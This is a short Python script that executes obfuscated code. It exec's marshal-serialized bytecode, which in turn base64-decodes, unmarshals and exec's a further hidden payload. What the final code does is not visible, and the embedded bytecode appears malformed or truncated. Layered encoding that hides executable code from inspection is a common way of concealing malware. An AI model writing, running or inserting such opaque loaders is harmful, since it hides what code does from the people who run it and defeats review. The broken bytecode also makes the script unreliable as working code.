#!/usr/bin/python3
import marshal; exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00@\x00\x00\x00s,\x00\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01e\x00\xa0\x02e\x01\xa0\x03d\x02\xa1\x01\xa1\x01Z\x04e\x05e\x04\x83\x01\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Ns }\x01\)\x06\xda\x07marshal\xda\x06base64\xda\x05loads\xda\tb64decodeZ\texec_code\xda\x04exec\xa9\x00r\x07\x00\x00\x00r\x07\x00\x00\x00\xfa\x08<string>\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00'))